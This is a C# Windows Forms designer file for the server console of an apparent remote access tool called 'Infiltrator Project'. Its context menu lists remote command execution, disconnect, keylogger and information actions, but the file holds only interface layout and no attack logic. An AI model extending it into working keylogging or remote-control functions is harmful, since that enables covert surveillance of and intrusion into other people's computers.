

namespace Server
{
    partial class MainForm
    {
        /// <summary>
        ///  Required designer variable.
        /// </summary>
        private System.ComponentModel.IContainer components = null;

        /// <summary>
        ///  Clean up any resources being used.
        /// </summary>
        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
        protected override void Dispose(bool disposing)
        {
            if (disposing && (components != null))
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        #region Windows Form Designer generated code

        /// <summary>
        ///  Required method for Designer support - do not modify
        ///  the contents of this method with the code editor.
        /// </summary>
        private void InitializeComponent()
        {
            components = new System.ComponentModel.Container();
            System.ComponentModel.ComponentResourceManager resources = new System.ComponentModel.ComponentResourceManager(typeof(MainForm));
            label1 = new Label();
            panel2 = new Panel();
            pictureBox1 = new PictureBox();
            menuStrip1 = new MenuStrip();
            configuraciónToolStripMenuItem = new ToolStripMenuItem();
            informaciónToolStripMenuItem = new ToolStripMenuItem();
            utilidadesToolStripMenuItem = new ToolStripMenuItem();
            ayudaToolStripMenuItem = new ToolStripMenuItem();
            dataGridView1 = new DataGridView();
            contextMenuStrip1 = new ContextMenuStrip(components);
            pruebaToolStripMenuItem = new ToolStripMenuItem();
            xDToolStripMenuItem = new ToolStripMenuItem();
            keyloggerToolStripMenuItem = new ToolStripMenuItem();
            informaciónToolStripMenuItem1 = new ToolStripMenuItem();
            panel2.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).BeginInit();
            menuStrip1.SuspendLayout();
            ((System.ComponentModel.ISupportInitialize)dataGridView1).BeginInit();
            contextMenuStrip1.SuspendLayout();
            SuspendLayout();
            // 
            // label1
            // 
            label1.AutoSize = true;
            label1.Font = new Font("Segoe UI", 15.75F, FontStyle.Bold, GraphicsUnit.Point, 0);
            label1.ForeColor = SystemColors.Control;
            label1.Location = new Point(57, 4);
            label1.Name = "label1";
            label1.Size = new Size(288, 30);
            label1.TabIndex = 0;
            label1.Text = "Infiltrator Project Server 1.0";
            label1.Click += label1_Click;
            // 
            // panel2
            // 
            panel2.BackColor = Color.SteelBlue;
            panel2.Controls.Add(pictureBox1);
            panel2.Controls.Add(label1);
            panel2.Location = new Point(0, 457);
            panel2.Name = "panel2";
            panel2.Size = new Size(1209, 49);
            panel2.TabIndex = 6;
            // 
            // pictureBox1
            // 
            pictureBox1.BackgroundImage = (Image)resources.GetObject("pictureBox1.BackgroundImage");
            pictureBox1.BackgroundImageLayout = ImageLayout.Zoom;
            pictureBox1.Location = new Point(13, 4);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new Size(42, 30);
            pictureBox1.TabIndex = 7;
            pictureBox1.TabStop = false;
            // 
            // menuStrip1
            // 
            menuStrip1.BackColor = Color.SteelBlue;
            menuStrip1.Font = new Font("Segoe UI", 9F, FontStyle.Bold, GraphicsUnit.Point, 0);
            menuStrip1.Items.AddRange(new ToolStripItem[] { configuraciónToolStripMenuItem, utilidadesToolStripMenuItem, ayudaToolStripMenuItem });
            menuStrip1.Location = new Point(0, 0);
            menuStrip1.Name = "menuStrip1";
            menuStrip1.Size = new Size(1194, 24);
            menuStrip1.TabIndex = 7;
            menuStrip1.Text = "menuStrip1";
            // 
            // configuraciónToolStripMenuItem
            // 
            configuraciónToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[] { informaciónToolStripMenuItem });
            configuraciónToolStripMenuItem.Image = (Image)resources.GetObject("configuraciónToolStripMenuItem.Image");
            configuraciónToolStripMenuItem.Name = "configuraciónToolStripMenuItem";
            configuraciónToolStripMenuItem.Size = new Size(112, 20);
            configuraciónToolStripMenuItem.Text = "Configuración";
            // 
            // informaciónToolStripMenuItem
            // 
            informaciónToolStripMenuItem.Name = "informaciónToolStripMenuItem";
            informaciónToolStripMenuItem.Size = new Size(180, 22);
            informaciónToolStripMenuItem.Text = "Servidor";
            informaciónToolStripMenuItem.Click += informaciónToolStripMenuItem_Click;
            // 
            // utilidadesToolStripMenuItem
            // 
            utilidadesToolStripMenuItem.Name = "utilidadesToolStripMenuItem";
            utilidadesToolStripMenuItem.Size = new Size(74, 20);
            utilidadesToolStripMenuItem.Text = "Utilidades";
            // 
            // ayudaToolStripMenuItem
            // 
            ayudaToolStripMenuItem.Image = (Image)resources.GetObject("ayudaToolStripMenuItem.Image");
            ayudaToolStripMenuItem.Name = "ayudaToolStripMenuItem";
            ayudaToolStripMenuItem.Size = new Size(69, 20);
            ayudaToolStripMenuItem.Text = "Ayuda";
            ayudaToolStripMenuItem.Click += ayudaToolStripMenuItem_Click;
            // 
            // dataGridView1
            // 
            dataGridView1.AllowUserToAddRows = false;
            dataGridView1.AllowUserToDeleteRows = false;
            dataGridView1.AllowUserToResizeColumns = false;
            dataGridView1.AllowUserToResizeRows = false;
            dataGridView1.BackgroundColor = Color.FromArgb(44, 62, 80);
            dataGridView1.CausesValidation = false;
            dataGridView1.CellBorderStyle = DataGridViewCellBorderStyle.None;
            dataGridView1.ContextMenuStrip = contextMenuStrip1;
            dataGridView1.ImeMode = ImeMode.Disable;
            dataGridView1.Location = new Point(-6, 23);
            dataGridView1.MultiSelect = false;
            dataGridView1.Name = "dataGridView1";
            dataGridView1.ReadOnly = true;
            dataGridView1.RowHeadersVisible = false;
            dataGridView1.RowHeadersWidthSizeMode = DataGridViewRowHeadersWidthSizeMode.DisableResizing;
            dataGridView1.ShowCellErrors = false;
            dataGridView1.ShowCellToolTips = false;
            dataGridView1.ShowEditingIcon = false;
            dataGridView1.ShowRowErrors = false;
            dataGridView1.Size = new Size(1205, 434);
            dataGridView1.TabIndex = 8;
            dataGridView1.CellContentClick += dataGridView1_CellContentClick;
            // 
            // contextMenuStrip1
            // 
            contextMenuStrip1.Items.AddRange(new ToolStripItem[] { pruebaToolStripMenuItem, xDToolStripMenuItem, keyloggerToolStripMenuItem, informaciónToolStripMenuItem1 });
            contextMenuStrip1.Name = "contextMenuStrip1";
            contextMenuStrip1.Size = new Size(181, 114);
            // 
            // pruebaToolStripMenuItem
            // 
            pruebaToolStripMenuItem.Name = "pruebaToolStripMenuItem";
            pruebaToolStripMenuItem.Size = new Size(175, 22);
            pruebaToolStripMenuItem.Text = "Ejecutar comandos";
            pruebaToolStripMenuItem.Click += pruebaToolStripMenuItem_Click;
            // 
            // xDToolStripMenuItem
            // 
            xDToolStripMenuItem.Name = "xDToolStripMenuItem";
            xDToolStripMenuItem.Size = new Size(175, 22);
            xDToolStripMenuItem.Text = "Desconectar";
            xDToolStripMenuItem.Click += xDToolStripMenuItem_Click;
            // 
            // keyloggerToolStripMenuItem
            // 
            keyloggerToolStripMenuItem.Name = "keyloggerToolStripMenuItem";
            keyloggerToolStripMenuItem.Size = new Size(175, 22);
            keyloggerToolStripMenuItem.Text = "Keylogger";
            keyloggerToolStripMenuItem.Click += keyloggerToolStripMenuItem_Click;
            // 
            // informaciónToolStripMenuItem1
            // 
            informaciónToolStripMenuItem1.Name = "informaciónToolStripMenuItem1";
            informaciónToolStripMenuItem1.Size = new Size(180, 22);
            informaciónToolStripMenuItem1.Text = "Información";
            informaciónToolStripMenuItem1.Click += informaciónToolStripMenuItem1_Click;
            // 
            // MainForm
            // 
            AutoScaleDimensions = new SizeF(7F, 15F);
            AutoScaleMode = AutoScaleMode.Font;
            BackColor = Color.LightSteelBlue;
            ClientSize = new Size(1194, 503);
            Controls.Add(panel2);
            Controls.Add(menuStrip1);
            Controls.Add(dataGridView1);
            FormBorderStyle = FormBorderStyle.FixedDialog;
            Icon = (Icon)resources.GetObject("$this.Icon");
            MainMenuStrip = menuStrip1;
            MaximizeBox = false;
            MdiChildrenMinimizedAnchorBottom = false;
            MinimizeBox = false;
            Name = "MainForm";
            Text = "Infiltrator Project -  version 1.0";
            Load += Form1_Load;
            panel2.ResumeLayout(false);
            panel2.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)pictureBox1).EndInit();
            menuStrip1.ResumeLayout(false);
            menuStrip1.PerformLayout();
            ((System.ComponentModel.ISupportInitialize)dataGridView1).EndInit();
            contextMenuStrip1.ResumeLayout(false);
            ResumeLayout(false);
            PerformLayout();
        }

        #endregion

        private Label label1;
        private Panel panel2;
        private PictureBox pictureBox1;
        private MenuStrip menuStrip1;
        private ToolStripMenuItem configuraciónToolStripMenuItem;
        private ToolStripMenuItem informaciónToolStripMenuItem;
        private ToolStripMenuItem utilidadesToolStripMenuItem;
        private ToolStripMenuItem ayudaToolStripMenuItem;
        private DataGridView dataGridView1;
        private ContextMenuStrip contextMenuStrip1;
        private ToolStripMenuItem pruebaToolStripMenuItem;
        private ToolStripMenuItem xDToolStripMenuItem;
        private ToolStripMenuItem keyloggerToolStripMenuItem;
        private ToolStripMenuItem informaciónToolStripMenuItem1;
    }
}
